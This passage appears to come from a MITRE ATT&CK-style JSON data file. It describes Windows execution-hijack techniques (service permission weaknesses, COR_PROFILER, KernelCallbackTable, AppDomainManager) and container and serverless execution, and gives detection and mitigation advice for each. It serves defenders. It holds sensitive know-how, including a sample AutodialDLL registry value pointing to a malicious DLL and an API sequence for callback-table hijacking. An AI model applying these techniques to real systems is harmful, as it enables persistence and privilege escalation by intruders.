class=\"citation\">(Citation: Vulnerability and Exploit Detector)</a>"}]},{"id":"T1574.010","name":"Services File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":["Windows"],"dataSources":["File: File Modification","File: File Creation","Process: Process Creation","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"},{"id":"M1052","name":"User Account Control","description":"Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System]</code>to automatically deny elevation requests, add: <code>\"ConsentPromptBehaviorUser\"=dword:00000000</code>. Consider enabling installer detection for all users by adding: <code>\"EnableInstallerDetection\"=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>\"EnableInstallerDetection\"=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged. <a href=\"https://seclists.org/fulldisclosure/2015/Dec/34\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Executable Installers are Vulnerable)</a>"}]},{"id":"T1574.011","name":"Services Registry Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  PowerShell, or Reg. Access to Registry keys is controlled through access control lists and user permissions. <a href=\"https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Registry Key Security)</a> <a href=\"https://www.bleepingcomputer.com/tutorials/how-malware-hides-as-a-service/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: malware_hides_service)</a>\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted. <a href=\"https://trustedsignal.blogspot.com/2014/05/kansa-service-related-collectors-and.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kansa Service related collectors)</a> <a href=\"https://x.com/r0wdy_/status/936365549553991680\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tweet Registry Perms Weakness)</a>\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL. <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: microsoft_services_registry_tree)</a> If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL. <a href=\"https://itm4n.github.io/windows-registry-rpceptmapper-eop/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: insecure_reg_perms)</a>\n\nAdversaries may also add the <code>Parameters</code> key, which can reference malicious drivers file paths. This technique has been identified to be a method of abuse by configuring DLL file paths within the <code>Parameters</code> key of a given services registry configuration. By placing and configuring the <code>Parameters</code> key to reference a malicious DLL, adversaries can ensure that their code is loaded persistently whenever the associated service or library is invoked.\n\nFor example, the registry path <a href=\"https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MDSec)</a> <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters</code> <a href=\"https://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hexacorn)</a> <a href=\"https://www.gendigital.com/blog/insights/research/operation-dragon-castling-apt-group-targeting-betting-companies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: gendigital)</a> contains the <code>AutodiaDLL</code> value, which specifies the DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code> to point to a hijacked or malicious DLL:\n\n<code>\"AutodialDLL\"=\"c:\\temp\\foo.dll\"</code>\n\nThis ensures persistence, as it causes the DLL (in this case, foo.dll) to be loaded each time the Winsock 2 library is invoked.","detection":"Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Autoruns for Windows)</a> Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Modification","Service: Service Modification","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."}]},{"id":"T1574.012","name":"COR_PROFILER","description":"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR. <a href=\"https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/profiling/profiling-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Profiling Mar 2017)</a> <a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COR_PROFILER Feb 2013)</a>\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable. <a href=\"https://docs.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ee471451(v=vs.100)\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft COR_PROFILER Feb 2013)</a>\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and impair defenses provided by .NET processes. <a href=\"https://redcanary.com/blog/blue-mockingbird-cryptominer/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedCanary Mockingbird May 2020)</a> <a href=\"https://redcanary.com/blog/cor_profiler-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary COR_PROFILER May 2020)</a> <a href=\"https://offsec.almond.consulting/UAC-bypass-dotnet.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Almond COR_PROFILER Apr 2019)</a> <a href=\"https://github.com/OmerYa/Invisi-Shell\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub OmerYa Invisi-Shell)</a> <a href=\"https://web.archive.org/web/20170720041203/http://subt0x10.blogspot.com/2017/05/subvert-clr-process-listing-with-net.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: subTee .NET Profilers May 2017)</a>","detection":"For detecting system and user scope abuse of the COR_PROFILER, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools. Extra scrutiny should be placed on suspicious modification of these Registry keys by command line tools like wmic.exe, setx.exe, and Reg, monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection. For system, user, and process scope abuse of the COR_PROFILER, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior. <a href=\"https://redcanary.com/blog/cor_profiler-for-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary COR_PROFILER May 2020)</a> Consider monitoring for DLL files that are associated with COR_PROFILER environment variables.","platforms":["Windows"],"dataSources":["Process: Process Creation","Windows Registry: Windows Registry Key Modification","Module: Module Load","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the privileges of user accounts so that only authorized administrators can edit system environment variables."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys associated with COR_PROFILER."},{"id":"M1038","name":"Execution Prevention","description":"Identify and block potentially malicious unmanaged COR_PROFILER profiling DLLs  by using application control solutions like AppLocker that are capable of auditing and/or blocking unapproved DLLs. <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a>"}]},{"id":"T1574.013","name":"KernelCallbackTable","description":"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a> (Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded. <a href=\"https://modexp.wordpress.com/2019/05/25/windows-injection-finspy/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Process Injection KernelCallbackTable)</a>\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> Native API function). <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NtQueryInformationProcess)</a> Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a>\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a> Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.","detection":"Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.\n\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique. <a href=\"https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lazarus APT January 2022)</a>","platforms":["Windows"],"dataSources":["Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of behaviors related to process injection/memory tampering based on common sequences of indicators (ex: execution of specific API functions)."}]},{"id":"T1574.014","name":"AppDomainManager","description":"Adversaries may execute their own malicious payloads by hijacking how the .NET <code>AppDomainManager</code> loads assemblies. The .NET framework uses the <code>AppDomainManager</code> class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (<code>.exe</code> or <code>.dll</code> binaries compiled to run as .NET code) may be loaded into an application domain as executable code. <a href=\"https://learn.microsoft.com/dotnet/framework/app-domains/application-domains\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft App Domains)</a> \n\nKnown as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (<code>.config</code>) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process. <a href=\"https://pentestlaboratories.com/2020/05/26/appdomainmanager-injection-and-detection/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PenTestLabs AppDomainManagerInject)</a> <a href=\"https://www.pwc.com/gx/en/issues/cybersecurity/cyber-threat-intelligence/yellow-liderc-ships-its-scripts-delivers-imaploader-malware.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PwC Yellow Liderc)</a> <a href=\"https://www.rapid7.com/blog/post/2023/05/05/appdomain-manager-injection-new-techniques-for-red-teams/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 AppDomain Manager Injection)</a>","detection":"","platforms":["Windows"],"dataSources":["Module: Module Load","File: File Creation","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Install .NET applications and related software in write-protected locations. Set directory access controls to prevent file writes to the search paths for .NET applications, both in the folders where applications are run from and the standard resources folders."}]}]},{"id":"T1609","name":"Container Administration Command","description":"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment. <a href=\"https://docs.docker.com/engine/reference/commandline/dockerd/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon CLI)</a> <a href=\"https://kubernetes.io/docs/concepts/overview/kubernetes-api/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API)</a> <a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Kubelet)</a>\n\nIn Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container. <a href=\"https://docs.docker.com/engine/reference/run/#entrypoint-default-command-to-execute-at-runtime\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Entrypoint)</a> <a href=\"https://docs.docker.com/engine/reference/commandline/exec/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Exec)</a> In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>. <a href=\"https://kubernetes.io/docs/tasks/debug-application-cluster/get-shell-running-container/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubectl Exec Get Shell)</a>","detection":"Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster.","platforms":["Containers"],"dataSources":["Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce authentication and role-based access control on the container service to restrict users to the least privileges required. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a> When using Kubernetes, avoid giving users wildcard permissions or adding users to the <code>system:masters</code> group, and use <code>RoleBindings</code> rather than <code>ClusterRoleBindings</code> to limit user privileges to specific namespaces. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers and using the <code>NodeRestriction</code> admission controller to deny the kublet access to nodes and pods outside of the node it belongs to. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a> <a href=\"https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Admission Controllers)</a>"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server. <a href=\"https://docs.docker.com/engine/security/protect-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon Socket Protect)</a> <a href=\"https://kubernetes.io/docs/concepts/security/controlling-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API Control Access)</a> In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. <a href=\"https://kubernetes.io/docs/concepts/security/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Cloud Native Security)</a> Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access. <a href=\"https://learn.microsoft.com/en-us/azure/aks/managed-aad\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AKS Azure AD 2023)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Use read-only containers, read-only file systems, and minimal images when possible to prevent the execution of commands. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a> Where possible, also consider using application control and software restriction tools (such as those provided by SELinux) to restrict access to files, processes, and system calls in containers. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/security-context/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Security Context)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Remove unnecessary tools and software from containers."}],"subTechniques":[]},{"id":"T1610","name":"Deploy Container","description":"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to Escape to Host and access other containers running on the node. <a href=\"https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppSecco Kubernetes Namespace Breakout 2020)</a>\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. <a href=\"https://docs.docker.com/reference/cli/docker/container/create/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Container)</a> <a href=\"https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Dashboard)</a> <a href=\"https://www.kubeflow.org/docs/components/pipelines/overview/pipelines-overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubeflow Pipelines)</a> In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes. <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Workload Management)</a> Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime. <a href=\"https://blog.aquasec.com/malicious-container-image-docker-container-host\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aqua Build Images on Hosts)</a>","detection":"Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.","platforms":["Containers"],"dataSources":["Container: Container Start","Application Log: Application Log Content","Pod: Pod Creation","Container: Container Creation","Pod: Pod Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce the principle of least privilege by limiting container dashboard access to only the necessary users. When using Kubernetes, avoid giving users wildcard permissions or adding users to the <code>system:masters</code> group, and use <code>RoleBindings</code> rather than <code>ClusterRoleBindings</code> to limit user privileges to specific namespaces. <a href=\"https://kubernetes.io/docs/concepts/security/rbac-good-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes RBAC)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API, Kubernetes API Server, and container orchestration web applications. <a href=\"https://docs.docker.com/engine/security/protect-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Docker Daemon Socket Protect)</a> <a href=\"https://kubernetes.io/docs/concepts/security/controlling-access/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes API Control Access)</a> In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. <a href=\"https://kubernetes.io/docs/concepts/security/overview/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Cloud Native Security)</a> Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access. <a href=\"https://learn.microsoft.com/en-us/azure/aks/managed-aad\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AKS Azure AD 2023)</a>"},{"id":"M1047","name":"Audit","description":"Scan images before deployment, and block those that are not in compliance with security policies. In Kubernetes environments, the admission controller can be used to validate images after a container deployment request is authenticated but before the container is deployed. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"}],"subTechniques":[]},{"id":"T1648","name":"Serverless Execution","description":"Adversaries may abuse serverless computing, integration, and automation services to execute arbitrary code in cloud environments. Many cloud providers offer a variety of serverless resources, including compute engines, application integration services, and web servers. \n\nAdversaries may abuse these resources in various ways as a means of executing arbitrary commands. For example, adversaries may use serverless functions to execute malicious code, such as crypto-mining malware (i.e. Resource Hijacking). <a href=\"https://www.cadosecurity.com/cado-discovers-denonia-the-first-malware-specifically-targeting-lambda/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cado Security Denonia)</a> Adversaries may also create functions that enable further compromise of the cloud environment. For example, an adversary may use the <code>IAM:PassRole</code> permission in AWS or the <code>iam.serviceAccounts.actAs</code> permission in Google Cloud to add Additional Cloud Roles to a serverless cloud function, which may then be able to perform actions the original user cannot. <a href=\"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS Privilege Escalation)</a> <a href=\"https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhingo Security Labs GCP Privilege Escalation)</a>\n\nServerless functions can also be invoked in response to cloud events (i.e. Event Triggered Execution), potentially enabling persistent execution over time. For example, in AWS environments, an adversary may create a Lambda function that automatically adds Additional Cloud Credentials to a user and a corresponding CloudWatch events rule that invokes that function whenever a new user is created. <a href=\"https://medium.com/daniel-grzelak/backdooring-an-aws-account-da007d36f8f9\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Backdooring an AWS account)</a> This is also possible in many cloud-based office application suites. For example, in Microsoft 365 environments, an adversary may create a Power Automate workflow that forwards all emails a user receives or creates anonymous sharing links whenever a user is granted access to a document in SharePoint. <a href=\"https://www.varonis.com/blog/power-automate-data-exfiltration\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis Power Automate Data Exfiltration)</a> <a href=\"https://www.microsoft.com/security/blog/2020/03/09/real-life-cybercrime-stories-dart-microsoft-detection-and-response-team\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft DART Case Report 001)</a> In Google Workspace environments, they may instead create an Apps Script that exfiltrates a user's data when they open a file. <a href=\"https://cloud.hacktricks.xyz/pentesting-cloud/workspace-security/gws-google-platforms-phishing/gws-app-scripts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cloud Hack Tricks GWS Apps Script)</a> <a href=\"https://www.own.security/ressources/blog/google-workspace-malicious-app-script-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWN-CERT Google App Script 2024)</a>","detection":"","platforms":["SaaS","IaaS","Office Suite"],"dataSources":["Cloud Service: Cloud Service Modification","Application Log: Application Log Content"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Remove permissions to create, modify, or run serverless resources from users that do not explicitly require them."},{"id":"M1036","name":"Account Use Policies","description":"Where possible, consider restricting access to and use of serverless functions. For examples, conditional access policies can be applied to users attempting to create workflows in Microsoft Power Automate. Google Apps Scripts that use OAuth can be limited by restricting access to high-risk OAuth scopes. <a href=\"https://devblogs.microsoft.com/premier-developer/control-access-to-power-apps-and-power-automate-with-azure-ad-conditional-access-policies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Developer Support Power Apps Conditional Access)</a> <a href=\"https://developers.google.com/apps-script/guides/admin/monitor-restrict-oauth-scopes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Workspace Apps Script Restrict OAuth Scopes)</a>"}],"subTechniques":[]},{"id":"T1651","name":"Cloud Administration Command","description":"Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. <a href=\"https://docs.aws.amazon.com/systems-manager/latest/userguide/run-command.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Systems 